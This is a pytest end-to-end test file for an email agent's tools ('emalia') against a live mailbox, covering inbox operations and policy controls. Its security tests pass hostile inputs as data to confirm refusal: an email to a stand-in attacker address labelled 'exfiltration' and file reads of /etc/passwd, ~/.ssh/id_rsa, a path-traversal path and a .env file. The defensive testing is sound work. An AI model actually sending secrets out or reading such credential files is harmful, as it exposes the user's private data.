"""The agent's tools against a real mailbox, with no model involved.

The tools are plain functions returning plain strings, which means the layer
between the model and the mail server can be tested on its own. If something
breaks here, no amount of prompting will fix it; if everything passes here and
the agent still misbehaves, the problem is the prompt.
"""

from __future__ import annotations

from collections.abc import Callable
from pathlib import Path

import pytest

from emalia.mail.client import MailClient
from emalia.mail.models import EmailMessage
from emalia.security.policy import Policy
from emalia.tools.email_tools import EmailTools
from emalia.tools.file_tools import FileReadTools
from emalia.tools.registry import build_tools

pytestmark = [pytest.mark.e2e, pytest.mark.network]


@pytest.fixture
def tool_policy(tmp_path: Path) -> Policy:
    """A policy allowing the email and file_read groups against a temp root."""
    return Policy(
        allowed_senders=["someone@example.com"],
        allowed_recipients=[],
        sandbox_roots=[tmp_path],
        enabled_toolsets=["email", "file_read"],
        max_tool_calls=200,
    )


@pytest.fixture
def email_tools(bot: MailClient, tool_policy: Policy) -> dict[str, Callable[..., str]]:
    """The email tools, keyed by the name the model would call them by."""
    return {tool.__name__: tool for tool in EmailTools(bot, tool_policy).tools()}


class TestEmailToolsAgainstARealServer:
    def test_list_inbox_returns_readable_lines(
        self,
        email_tools: dict[str, Callable[..., str]],
        bot: MailClient,
        subject: Callable[[str], str],
        wait_for_subject: Callable[..., EmailMessage],
    ) -> None:
        line = subject("tool list_inbox")
        bot.send(to=bot.account.address, subject=line, body="listing test")
        wait_for_subject(line)

        output = email_tools["list_inbox"](limit=25)
        assert line in output
        # Whatever comes back goes straight into a model's context, so it has
        # to be text, not a repr of a dataclass.
        assert "EmailMessage(" not in output

    def test_read_email_returns_the_body(
        self,
        email_tools: dict[str, Callable[..., str]],
        bot: MailClient,
        subject: Callable[[str], str],
        wait_for_subject: Callable[..., EmailMessage],
    ) -> None:
        line = subject("tool read_email")
        bot.send(to=bot.account.address, subject=line, body="A distinctive sentence to find.")
        message = wait_for_subject(line)
        assert message.uid is not None

        output = email_tools["read_email"](uid=message.uid)
        assert "A distinctive sentence to find." in output

    def test_search_email_finds_the_tagged_message(
        self,
        email_tools: dict[str, Callable[..., str]],
        bot: MailClient,
        run_tag: str,
        subject: Callable[[str], str],
        wait_for_subject: Callable[..., EmailMessage],
    ) -> None:
        line = subject("tool search_email")
        bot.send(to=bot.account.address, subject=line, body="searchable via tool")
        wait_for_subject(line)

        assert run_tag in email_tools["search_email"](subject=run_tag)

    def test_mark_email_changes_the_flag(
        self,
        email_tools: dict[str, Callable[..., str]],
        bot: MailClient,
        subject: Callable[[str], str],
        wait_for_subject: Callable[..., EmailMessage],
    ) -> None:
        line = subject("tool mark_email")
        bot.send(to=bot.account.address, subject=line, body="mark me")
        message = wait_for_subject(line)
        assert message.uid is not None

        email_tools["mark_email"](uid=message.uid, state="read")
        assert "\\Seen" in bot.fetch(message.uid).flags

        email_tools["mark_email"](uid=message.uid, state="unread")
        assert "\\Seen" not in bot.fetch(message.uid).flags

    def test_list_folders_names_the_inbox(self, email_tools: dict[str, Callable[..., str]]) -> None:
        assert "INBOX" in email_tools["list_folders"]().upper()

    def test_save_attachments_writes_inside_the_sandbox(
        self,
        email_tools: dict[str, Callable[..., str]],
        bot: MailClient,
        tmp_path: Path,
        subject: Callable[[str], str],
        wait_for_subject: Callable[..., EmailMessage],
    ) -> None:
        source = tmp_path / "report.txt"
        source.write_text("quarterly figures", encoding="utf-8")

        line = subject("tool save_attachments")
        bot.send(
            to=bot.account.address,
            subject=line,
            body="attached",
            attachments=[str(source)],
        )
        message = wait_for_subject(line)
        assert message.uid is not None

        destination = tmp_path / "inbox-attachments"
        output = email_tools["save_attachments"](uid=message.uid, directory=str(destination))
        assert "report" in output
        assert (destination / "report.txt").read_text(encoding="utf-8") == "quarterly figures"


class TestPolicyHoldsAgainstARealServer:
    """The controls have to survive contact with a live mailbox, not just fakes."""

    def test_send_email_refuses_an_address_outside_the_policy(
        self, email_tools: dict[str, Callable[..., str]]
    ) -> None:
        # No exception: a tool that raises would abort the agent's turn. It
        # returns a refusal the model can read and explain to the sender.
        output = email_tools["send_email"](
            to="attacker@example.invalid",
            subject="exfiltration",
            body="secrets",
        )
        assert "PolicyError" in output or "not allowed" in output.lower()

    def test_file_tools_refuse_a_path_outside_the_sandbox(self, tool_policy: Policy) -> None:
        tools = {tool.__name__: tool for tool in FileReadTools(tool_policy).tools()}
        for candidate in ("/etc/passwd", "~/.ssh/id_rsa", "../../secrets.txt"):
            output = tools["read_file"](path=candidate)
            assert "SandboxError" in output or "outside" in output.lower(), candidate

    def test_file_tools_refuse_a_credential_file_inside_the_sandbox(
        self, tool_policy: Policy, tmp_path: Path
    ) -> None:
        (tmp_path / ".env").write_text("EMALIA_PASSWORD=hunter2\n", encoding="utf-8")
        tools = {tool.__name__: tool for tool in FileReadTools(tool_policy).tools()}

        output = tools["read_file"](path=str(tmp_path / ".env"))
        assert "hunter2" not in output

    def test_disabled_toolsets_are_never_constructed(self, bot: MailClient, tmp_path: Path) -> None:
        policy = Policy(
            allowed_senders=["someone@example.com"],
            sandbox_roots=[tmp_path],
            enabled_toolsets=["email"],
        )
        names = {tool.__name__ for tool in build_tools(policy, client=bot)}

        assert "list_inbox" in names
        # Not merely refused when called: absent, so the model cannot see them.
        assert names.isdisjoint({"read_file", "write_file", "run_shell", "run_python"})

    def test_the_tool_budget_stops_a_runaway(self, bot: MailClient, tmp_path: Path) -> None:
        policy = Policy(
            allowed_senders=["someone@example.com"],
            sandbox_roots=[tmp_path],
            enabled_toolsets=["email"],
            max_tool_calls=3,
        )
        tools = {tool.__name__: tool for tool in EmailTools(bot, policy).tools()}

        outputs = [tools["list_folders"]() for _ in range(5)]
        assert all("RateLimitError" not in out for out in outputs[:3])
        assert all("RateLimitError" in out for out in outputs[3:])

        # And the budget is per request, not for the life of the process.
        policy.reset_tool_calls()
        assert "RateLimitError" not in tools["list_folders"]()
